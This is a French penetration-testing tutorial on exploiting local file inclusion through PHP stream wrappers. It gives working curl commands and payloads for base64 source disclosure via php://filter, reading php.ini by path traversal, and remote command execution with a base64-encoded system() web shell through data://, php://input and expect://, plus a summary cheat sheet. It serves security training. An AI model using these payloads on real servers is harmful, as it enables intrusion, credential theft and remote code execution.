# Filtres et wrappers PHP

En PHP, les wrappers de flux permettent d'accéder à différents canaux d'entrée/sortie au niveau applicatif : entrée standard, descripteurs de fichiers, flux mémoire. Cette mécanique, pensée pour les développeurs, devient un levier redoutable lors d'une inclusion de fichier. On peut s'en servir pour lire le code source d'une application (là où une inclusion classique exécuterait le PHP sans rien afficher), puis aller jusqu'à l'exécution de commandes sur le serveur.

## Pourquoi

Quand on inclut un fichier PHP via une LFI classique, le moteur PHP l'exécute et rend le HTML résultant. Un fichier comme `config.php` qui ne produit aucune sortie HTML affichera une page blanche, alors qu'il contient potentiellement des identifiants de base de données ou des clés API. Les filtres PHP permettent de contourner ce comportement en encodant le contenu avant son interprétation. Les wrappers d'exécution, eux, permettent d'injecter du code PHP arbitraire pour obtenir une exécution de commandes distante.

## Comment ça marche

### Les filtres PHP (php://filter)

Le wrapper `php://filter/` applique des transformations sur un flux avant de le retourner. Il accepte deux paramètres principaux :

| Paramètre | Role |
|-----------|------|
| `resource` | Le flux cible (fichier local, URL) |
| `read` | Le filtre à appliquer en lecture |

PHP propose quatre catégories de filtres :

| Catégorie | Exemples |
|-----------|----------|
| String Filters | `string.rot13`, `string.toupper`, `string.tolower` |
| Conversion Filters | `convert.base64-encode`, `convert.base64-decode`, `convert.quoted-printable-encode` |
| Compression Filters | `zlib.deflate`, `zlib.inflate`, `bzip2.compress` |
| Encryption Filters | `mcrypt.*`, `mdecrypt.*` (dépréciés) |

Pour la divulgation de code source, le filtre qui nous intéresse est `convert.base64-encode`. Il encode le contenu du fichier en base64 avant que PHP ne tente de l'interpréter, ce qui nous renvoie le code source encodé au lieu d'une page blanche.

### Inclusion standard vs filtre base64

Quand on inclut un fichier PHP normalement :

```
http://<IP_CIBLE>:<PORT>/index.php?language=config
```

Le moteur PHP exécute `config.php` et on obtient une page vide (le fichier ne génère aucun HTML). Avec le filtre base64 :

```
http://<IP_CIBLE>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=config
```

On récupère une chaîne encodée en base64 contenant le code source complet du fichier.

{% hint style="info" %}
Si l'application ajoute automatiquement l'extension `.php`, il suffit de spécifier le nom du fichier sans extension dans le paramètre `resource`. Le `.php` sera ajouté par l'application, ce qui donnera `config.php`.
{% endhint %}

### Les wrappers d'exécution

Trois wrappers PHP permettent d'aller au-delà de la lecture de fichiers et d'exécuter du code arbitraire. Deux d'entre eux nécessitent que `allow_url_include` soit activé dans la configuration PHP.

**Le wrapper data://**

Le wrapper `data://` permet d'inclure des données externes directement dans l'URL, y compris du code PHP encodé en base64. Il nécessite `allow_url_include = On`.

**Le wrapper php://input**

Le wrapper `php://input` lit le corps de la requête POST et l'utilise comme flux d'entrée. Si la fonction vulnérable exécute le contenu inclus, le code PHP envoyé dans le corps POST sera exécuté. Il nécessite aussi `allow_url_include = On`.

**Le wrapper expect://**

Le wrapper `expect://` est une extension externe qui permet d'exécuter des commandes système directement via l'URL. Il n'est pas installé par défaut et doit être explicitement activé dans la configuration PHP (`extension=expect`).

## En pratique

### Divulgation de code source avec php://filter

Avant de lire les sources, il est judicieux de commencer par identifier les fichiers PHP disponibles sur le serveur avec un outil de fuzzing :

```bash
ffuf -w /opt/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ \
     -u "http://<IP_CIBLE>:<PORT>/FUZZ.php"
```

{% hint style="success" %}
Ne pas se limiter aux codes HTTP 200. En contexte de LFI, les fichiers renvoyant des 301, 302 ou 403 sont tout aussi lisibles via le filtre base64.
{% endhint %}

Une fois les fichiers identifiés, on peut lire leur source :

```bash
# Lecture de config.php via le filtre base64
curl -s "http://<IP_CIBLE>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=config"
```

Le résultat est une longue chaîne base64 qu'on décode ensuite :

```bash
echo 'PD9waHAKJGNvbmZpZyA9IGFycmF5KC4uLik7Cg==' | base64 -d
```

On obtient le code source complet, avec potentiellement des identifiants, des clés API ou des chemins internes.

{% hint style="warning" %}
Lors de la copie de la chaîne base64 depuis le navigateur, veiller à copier l'intégralité de la chaîne. Une chaîne tronquée ne se décodera pas correctement. Utiliser "Afficher le source de la page" pour s'assurer de capturer toute la sortie.
{% endhint %}

### Vérification de allow_url_include

Avant d'utiliser les wrappers `data://` ou `php://input`, on doit vérifier que `allow_url_include` est activé. On peut le faire en lisant le fichier `php.ini` via la LFI :

```bash
# Lire php.ini via le filtre base64
curl -s "http://<IP_CIBLE>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"

# Décoder et vérifier le paramètre
echo '<CHAINE_BASE64>' | base64 -d | grep allow_url_include
```

Si le résultat indique `allow_url_include = On`, les wrappers `data://` et `php://input` sont exploitables.

{% hint style="info" %}
Ce paramètre est désactivé par défaut. Il n'est pas rare de le trouver activé sur des applications qui en dépendent pour fonctionner (certains plugins WordPress, par exemple).
{% endhint %}

### Exécution de commandes avec data://

On commence par encoder un web shell en base64 :

```bash
echo '<?php system($_GET["cmd"]); ?>' | base64
# Résultat : PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==
```

Puis on passe cette chaîne dans le wrapper `data://`, en URL-encodant les caractères spéciaux :

```bash
curl -s "http://<IP_CIBLE>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id"
```

Le serveur décode le base64, exécute le PHP, et on obtient le résultat de la commande `id`.

### Exécution de commandes avec php://input

Le wrapper `php://input` fonctionne via une requête POST. Le code PHP est transmis dans le corps de la requête :

```bash
curl -s -X POST \
     --data '<?php system($_GET["cmd"]); ?>' \
     "http://<IP_CIBLE>:<PORT>/index.php?language=php://input&cmd=id"
```

{% hint style="info" %}
Pour que la commande passe en paramètre GET alors que le corps est en POST, la fonction vulnérable doit utiliser `$_REQUEST` (qui accepte les deux). Si elle n'accepte que POST, on peut intégrer la commande directement dans le code PHP : `<?php system('id'); ?>`.
{% endhint %}

### Exécution de commandes avec expect://

Si l'extension `expect` est disponible, l'exécution est directe :

```bash
curl -s "http://<IP_CIBLE>:<PORT>/index.php?language=expect://id"
```

Pour vérifier si l'extension est chargée, on peut grep la configuration PHP obtenue via le filtre base64 :

```bash
echo '<CHAINE_BASE64_PHP_INI>' | base64 -d | grep expect
# Si on voit "extension=expect", l'extension est configurée
```

{% hint style="warning" %}
La présence de `extension=expect` dans la configuration ne garantit pas que l'extension est fonctionnelle. Elle peut échouer au chargement pour de multiples raisons. Il faut tester directement avec `expect://id` pour confirmer.
{% endhint %}

## Pièges et galères

- **Chaîne base64 tronquée** : le navigateur peut couper la sortie dans le rendu HTML. Toujours vérifier dans le source de la page pour copier la chaîne complète.
- **URL encoding des payloads** : le caractère `+` dans la chaîne base64 doit être encodé en `%2B` dans l'URL, et `=` en `%3D`. Sinon le serveur les interprète comme des séparateurs.
- **Extension .php ajoutée** : si l'application ajoute `.php` au paramètre, le filtre base64 reste fonctionnel (on lit `config.php`), mais le wrapper `data://` peut poser problème car le serveur essaiera d'ajouter `.php` à la fin du payload.
- **allow_url_include désactivé** : les wrappers `data://` et `php://input` seront inutilisables. Il faut se rabattre sur d'autres techniques (log poisoning, upload + LFI).
- **expect non installé** : c'est une extension externe rarement présente. Ne pas perdre de temps dessus si le grep ne renvoie rien.

## Retour terrain

En pentest, la première chose à faire après avoir confirmé une LFI est de lire les sources avec `php://filter`. Cela permet de comprendre la logique de l'application, d'identifier d'autres paramètres vulnérables et de trouver des identifiants en dur. Depuis Exegol, cURL est souvent plus pratique que le navigateur pour manipuler les chaînes base64 longues.

Pour l'exécution de commandes, `data://` est le wrapper le plus fiable des trois car il fonctionne en GET pur, sans dépendance à une extension externe. Le workflow classique est : vérifier `allow_url_include` via la LFI, puis encoder un shell en base64, et passer les commandes via `&cmd=`.

Si `allow_url_include` est désactivé, il faut explorer d'autres pistes pour l'exécution de code (log poisoning ou exploitation d'un upload de fichiers, couverts dans les sections suivantes de ce module).

## Mémo express

| Technique | Syntaxe | Prérequis |
|-----------|---------|-----------|
| Lecture source (base64) | `php://filter/read=convert.base64-encode/resource=fichier` | LFI |
| Décoder la sortie | `echo '<b64>' \| base64 -d` | - |
| Vérifier php.ini | Lire `/etc/php/X.Y/apache2/php.ini` via le filtre | LFI |
| RCE via data:// | `data://text/plain;base64,<shell_b64>&cmd=commande` | `allow_url_include = On` |
| RCE via php://input | POST body = code PHP, `language=php://input&cmd=commande` | `allow_url_include = On` |
| RCE via expect:// | `expect://commande` | Extension `expect` installée |
| Fuzzer les fichiers PHP | `ffuf -w wordlist -u URL/FUZZ.php` | - |

***
